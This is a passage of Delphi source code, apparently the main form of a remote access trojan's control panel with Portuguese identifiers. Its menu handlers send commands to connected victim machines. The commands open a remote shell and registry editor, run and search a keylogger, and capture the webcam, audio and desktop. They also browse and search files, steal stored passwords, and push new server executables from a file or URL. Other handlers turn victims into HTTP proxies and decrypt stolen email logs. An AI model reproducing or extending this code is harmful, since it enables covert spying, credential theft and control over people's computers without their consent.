    NovaJanelaShell.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[255];
  end;
end;

procedure TFormPrincipal.Regedit1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaRegistry: TFormRegistry;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[3] <> nil then
  begin
    TFormRegistry(ConAux.Forms[3]).Show;
    TFormRegistry(ConAux.Forms[3]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[271];
  end
  else
  begin
    NovaJanelaRegistry := TFormRegistry.Create(self, ConAux);
    NovaJanelaRegistry.FormStyle := fsStayOnTop;
    ConAux.Forms[3] := NovaJanelaRegistry;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaRegistry.Show;
    NovaJanelaRegistry.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[271];
  end;
end;

procedure TFormPrincipal.Keylogger1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaKeylogger: TFormKeylogger;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[4] <> nil then
  begin
    TFormKeylogger(ConAux.Forms[4]).NomePC := ConAux.Item.SubItems.Strings[0];
    TFormKeylogger(ConAux.Forms[4]).Show;
    TFormKeylogger(ConAux.Forms[4]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[39];
  end
  else
  begin
    NovaJanelaKeylogger := TFormKeylogger.Create(self, ConAux);
    NovaJanelaKeylogger.FormStyle := fsStayOnTop;
    ConAux.Forms[4] := NovaJanelaKeylogger;
    NovaJanelaKeylogger.NomePC := ConAux.Item.SubItems.Strings[0];
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaKeylogger.Show;
    NovaJanelaKeylogger.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[39];
  end;
end;

procedure TFormPrincipal.Desktopremoto1Click(Sender: TObject);
var
  Server, i: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if ConAux.Item <> nil then
      if ((ConAux.Forms[5] <> nil) and (TFormDesktop(ConAux.Forms[5]).FecharForm <> false)) or (ConAux.Forms[5] = nil) then
      enviarstring(ConAux.Athread, DESKTOP + '|', true);

    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if (ConAux.Item <> nil) and (ConAux.Item.Selected = true) then
      if ((ConAux.Forms[5] <> nil) and (TFormDesktop(ConAux.Forms[5]).FecharForm <> false)) or (ConAux.Forms[5] = nil) then
      begin
        sleep(5);
        enviarstring(ConAux.Athread, DESKTOP + '|', true);
      end;
      except
    end;
  end;
end;


procedure TFormPrincipal.Webcam1Click(Sender: TObject);
var
  Server, i: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if (ConAux.Item <> nil) and
         (ConAux.Item.SubItemImages[3] <> 283) then
         if ((ConAux.Forms[6] <> nil) and (TFormWebCam(ConAux.Forms[6]).FecharForm <> false)) or (ConAux.Forms[6] = nil) then
       enviarstring(ConAux.Athread, WEBCAM + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if (ConAux.Item <> nil) and
         (ConAux.Item.SubItemImages[3] <> 283) and
         (ConAux.Item.Selected = true) then
         if ((ConAux.Forms[6] <> nil) and (TFormWebCam(ConAux.Forms[6]).FecharForm <> false)) or (ConAux.Forms[6] = nil) then
      begin
        sleep(5);
        enviarstring(ConAux.Athread, WEBCAM + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Capturadeaudio1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaAudio: TFormAudio;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[7] <> nil then
  begin
    TFormAudio(ConAux.Forms[7]).NomePC := ConAux.Item.SubItems.Strings[0];
    TFormAudio(ConAux.Forms[7]).Show;
    TFormAudio(ConAux.Forms[7]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[292];
  end
  else
  begin
    NovaJanelaAudio := TFormAudio.Create(self, ConAux);
    NovaJanelaAudio.FormStyle := fsStayOnTop;
    ConAux.Forms[7] := NovaJanelaAudio;
    NovaJanelaAudio.NomePC := ConAux.Item.SubItems.Strings[0];
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaAudio.Show;
    NovaJanelaAudio.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[292];
  end;
end;


procedure TFormPrincipal.Panel1Resize(Sender: TObject);
begin
  LastPanel2size := panel1.Width - LastPanel1size;
  LastPanel1size := panel1.Width;
end;

procedure TFormPrincipal.Gerenciararquivos1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFileManager: TFormFileManager;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[8] <> nil then
  begin
    TFormFileManager(ConAux.Forms[8]).NomePC := ConAux.Item.SubItems.Strings[0];
    TFormFileManager(ConAux.Forms[8]).PageControl1.ActivePage := TFormFileManager(ConAux.Forms[8]).TabSheet1;
    TFormFileManager(ConAux.Forms[8]).Show;
    TFormFileManager(ConAux.Forms[8]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[306];
  end
  else
  begin
    NovaJanelaFileManager := TFormFileManager.Create(self, ConAux);
    NovaJanelaFileManager.FormStyle := fsStayOnTop;
    ConAux.Forms[8] := NovaJanelaFileManager;
    NovaJanelaFileManager.NomePC := ConAux.Item.SubItems.Strings[0];
    NovaJanelaFileManager.PageControl1.ActivePage := NovaJanelaFileManager.TabSheet1;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFileManager.Show;
    NovaJanelaFileManager.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[306];
  end;
end;

procedure TFormPrincipal.Senhas1Click(Sender: TObject);
var
  i, Server: integer;
  pass: string;
  ConAux: PConexao;

  NumeroServers: integer;
begin
  application.ProcessMessages;
  if UnitPasswords.PodeReceber = true then exit;

  if inputquery(pchar(traduzidos[353]), pchar(traduzidos[354]), pass) = false then exit;

  formPasswords.ListView1.Clear;
  UnitPasswords.PodeReceber := true;
  formPasswords.Show;
  formPasswords.FormStyle := fsStayOnTop;

  if pass = '' then pass := ' ';
  NumeroServers := Listview1.SelCount;
  formPasswords.statusbar1.Panels.Items[0].Text := traduzidos[517] + ' (' + '0' + '/' + inttostr(NumeroServers) + ')';
  formPasswords.progressbar1.Position := 0;
  formPasswords.progressbar1.Max := NumeroServers;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if ConAux.Item <> nil then
      EnviarString(ConAux.Athread, GETPASSWORD + '|' + pass + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, GETPASSWORD + '|' + pass + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Selecionaridioma1Click(Sender: TObject);
begin
  FormIdiomas.ShowModal;
end;

procedure TFormPrincipal.Arquivolocal1Click(Sender: TObject);
var
  server, i: integer;
  FileName: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  opendialog1.Filter := 'Executables (*.exe)' + '|*.exe';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;

  if opendialog1.Execute = false then exit;

  FileName := opendialog1.FileName;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      EnviarString(ConAux.Athread, UPDATESERVIDOR + '|' + FileName + '|', true);
      ChangeListViewLineColor(ConAux.Item, ClRed);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, UPDATESERVIDOR + '|' + FileName + '|', true);
        ChangeListViewLineColor(ConAux.Item, ClRed);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Downloaddainternet1Click(Sender: TObject);
var
  server, i: integer;
  Name: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  name := LastDownloadExec;
  if inputquery(pchar(traduzidos[131]), pchar(traduzidos[246]), name) = false then exit;
  LastDownloadExec := name;
  
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      EnviarString(ConAux.Athread, UPDATESERVIDORWEB + '|' + Name + '|', true);
      ChangeListViewLineColor(ConAux.Item, ClRed);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, UPDATESERVIDORWEB + '|' + Name + '|', true);
        ChangeListViewLineColor(ConAux.Item, ClRed);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Palavraskeylogger1Click(Sender: TObject);
var
  i, Server: integer;
  palavra: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if inputquery(pchar(traduzidos[403]), pchar(traduzidos[405]), palavra) = false then exit;
  if length(palavra) < 3 then
  begin
    messagedlg(pchar(traduzidos[406]), mtWarning, [mbOK], 0);
    exit;
  end;

  FormSearchKeylogger.ListView1.Clear;
  UnitSearchKeylogger.PodeReceber := true;
  FormSearchKeylogger.Show;
  FormSearchKeylogger.FormStyle := fsStayOnTop;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if ConAux.Item <> nil then
      EnviarString(ConAux.Athread, KEYLOGGERSEARCH + '|' + palavra + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, KEYLOGGERSEARCH + '|' + palavra + '|', true);
      end;
      except
    end;
  end;
end;


procedure TFormPrincipal.Arquivos1Click(Sender: TObject);
var
  i, Server: integer;
  palavra: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if inputquery(pchar(traduzidos[403]), pchar(traduzidos[407]), palavra) = false then exit;
  if length(palavra) < 3 then
  begin
    messagedlg(pchar(traduzidos[406]), mtWarning, [mbOK], 0);
    exit;
  end;

  FormSearchFiles.ListView1.Clear;
  UnitSearchFiles.PodeReceber := true;
  FormSearchFiles.Show;
  FormSearchFiles.FormStyle := fsStayOnTop;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if ConAux.Item <> nil then
      EnviarString(ConAux.Athread, FILESEARCH + '|' + palavra + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, FILESEARCH + '|' + palavra + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Sobre1Click(Sender: TObject);
begin
  FormInfo.ShowModal;
end;

procedure TFormPrincipal.Opesextras1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaOpcoesExtras: TFormOpcoesExtras;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[9] <> nil then
  begin
    TFormOpcoesExtras(ConAux.Forms[9]).Show;
    TFormOpcoesExtras(ConAux.Forms[9]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[459];
  end
  else
  begin
    NovaJanelaOpcoesExtras := TFormOpcoesExtras.Create(self, ConAux);
    NovaJanelaOpcoesExtras.FormStyle := fsStayOnTop;
    ConAux.Forms[9] := NovaJanelaOpcoesExtras;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaOpcoesExtras.Show;
    NovaJanelaOpcoesExtras.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[459];
  end;
end;

procedure TFormPrincipal.Download1Click(Sender: TObject);
begin
  ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Downloads\' + Listview1.Selected.SubItems.Strings[0] + '\');
  Shellexecute(0, 'open', 'explorer.exe', pchar(ExtractFilePath(ParamStr(0)) + 'Downloads\' + Listview1.Selected.SubItems.Strings[0] + '\'), pchar(extractfilepath(paramstr(0))), sw_normal);
end;

procedure TFormPrincipal.ListView1MouseMove(Sender: TObject;
  Shift: TShiftState; X, Y: Integer);
begin
  ListView1.Cursor := CrDefault;
  ListView2.Cursor := CrDefault;
  Panel2.Cursor := CrDefault;
end;

procedure TFormPrincipal.Visualizarlogsdeemail1Click(Sender: TObject);
var
  TempStr, TempStr1: string;
  c: cardinal;
begin
  opendialog1.Filter := 'Text Files (*.txt)' + '|*.txt';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;
  if opendialog1.Execute = false then exit;

  FormVisualizarLogs.Memo1.Clear;

  FormVisualizarLogs.memo1.Lines.BeginUpdate;
  FormVisualizarLogs.Memo1.Clear;
  TempStr := LerArquivo(opendialog1.FileName, c);
  while tempstr <> '' do
  begin
    application.ProcessMessages;
    TempStr1 := TempStr1 + EnDecrypt02(copy(tempstr, 1, pos('####', tempstr) - 1), MasterPassword);
    delete(tempstr, 1, pos('####', tempstr) - 1);
    delete(tempstr, 1, 4);
  end;
  FormVisualizarLogs.memo1.Text := TempStr1;
  FormVisualizarLogs.memo1.Text := FormKeylogger.MyReplaceString(FormVisualizarLogs.Memo1.Text);
  FormVisualizarLogs.memo1.Lines.EndUpdate;

  FormVisualizarLogs.ShowModal;
end;

procedure TFormPrincipal.MSNPopUp1URLClick(Sender: TObject; URL: String);
begin
  exit;
end;

procedure TFormPrincipal.Atualizardesktopautomtico1Click(Sender: TObject);
begin
  Atualizardesktopautomtico1.Checked := not Atualizardesktopautomtico1.Checked;
  RefreshDesktop := Atualizardesktopautomtico1.Checked;
  timer3.Enabled := RefreshDesktop;
  if RefreshDesktop = false then PodeSolicitarImgDesk := RefreshDesktop;
end;

procedure TFormPrincipal.Timer3Timer(Sender: TObject);
var
  i: integer;
begin
  PodeSolicitarImgDesk := true;
end;

procedure TFormPrincipal.CHAT1Click(Sender: TObject);
var
  i, Server: integer;
  ConAux: PConexao;
begin
  FormChatSettings.ShowModal;
  if UnitChatSettings.PodeIniciarCHAT = true then
  begin
    FormCHAT.Show;
    FormCHAT.FormStyle := fsStayOnTop;

    if FormPrincipal.Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        if ConAux.Item <> nil then
        EnviarString(ConAux.Athread, UnitChatSettings.DadosEnviar);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, UnitChatSettings.DadosEnviar);
      end;
      except
    end;
  end;

  end;
end;

procedure TFormPrincipal.Mostrartudo1Click(Sender: TObject);
begin
  Mostrartudo1.Checked := not Mostrartudo1.Checked;
end;

procedure TFormPrincipal.GeoIP1Click(Sender: TObject);
begin
  GeoIP1.Checked := not GeoIP1.Checked;
end;

procedure TFormPrincipal.Start1Click(Sender: TObject);
var
  i, j, Server: integer;
  Porta: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  Porta := LastProxyPort;
  if inputquery('HTTP Proxy', pchar(traduzidos[30]), Porta) then
  begin
    try
      strtoint(porta);
      except
      messagedlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    if (strtoint(porta) < 1) or (strtoint(porta) > 65535) then
    begin
      messagedlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    LastProxyPort := Porta;

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        EnviarString(ConAux.Athread, STARTPROXY + '|' + Porta + '|', true);
      end else
      messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          EnviarString(ConAux.Athread, STARTPROXY + '|' + Porta + '|', true);
        end;
        except
      end;
    end;
  end;
end;

procedure TFormPrincipal.Stop1Click(Sender: TObject);
var
  i, j, Server: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;
      EnviarString(ConAux.Athread, STOPPROXY + '|', true);
    end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, STOPPROXY + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Selecionarsomdenotificao1Click(Sender: TObject);
begin
  opendialog1.Filter := 'Wave File (*.wav)' + '|*.wav';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;
  if opendialog1.Execute = false then exit;

  SoundFile := opendialog1.FileName;
end;

procedure TFormPrincipal.IdTCPServer1Exception(AThread: TIdPeerThread;
  AException: Exception);
begin
 {$IFDEF SPYDEBUG} AddDebug(Erro44 + ' ' + AException.Message); {$ENDIF}
  AException := nil;
end;

procedure TFormPrincipal.PingTest1Click(Sender: TObject);
var
  i, j, Server: integer;
  ConAux: PConexao;
begin
  Label3.Caption := '';
  application.ProcessMessages;
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      Label3.Caption := '0';
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      for j := 0 to 99 do // enviar 100 comandos de ping com um intervalo de 10 milisec...
      begin
        sleep(10);
        ConAux.Athread.Connection.WriteLn(PINGTEST + '|');
      end;

      //ConAux.Athread.Connection.WriteLn(PINGTEST + '|');
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end;
end;

procedure TFormPrincipal.DesktopImage1Click(Sender: TObject);
var
  i, Server: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;
      EnviarString(ConAux.Athread, IMGDESK + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, IMGDESK + '|', true);
      end;
      except
    end;
  end;
end;


procedure TFormPrincipal.PopupMenuInfoPopup(Sender: TObject);
begin
  CopyWANIP1.Enabled := Listview2.Items.Item[0].Selected;
end;

procedure TFormPrincipal.CopyWANIP1Click(Sender: TObject);
var
  TempStr: string;
begin
  TempStr := listview2.Items.Item[0].Caption;
  if pos('/', TempStr) > 0 then SetClipboardText(copy(TempStr, 1, pos('/', TempStr) - 1));
end;

procedure TFormPrincipal.START2Click(Sender: TObject);
begin
  Arquivo1.Enabled := true;
  Opes1.Enabled := true;
  START2.Enabled := false;
  IniciarEscuta;
end;

end.
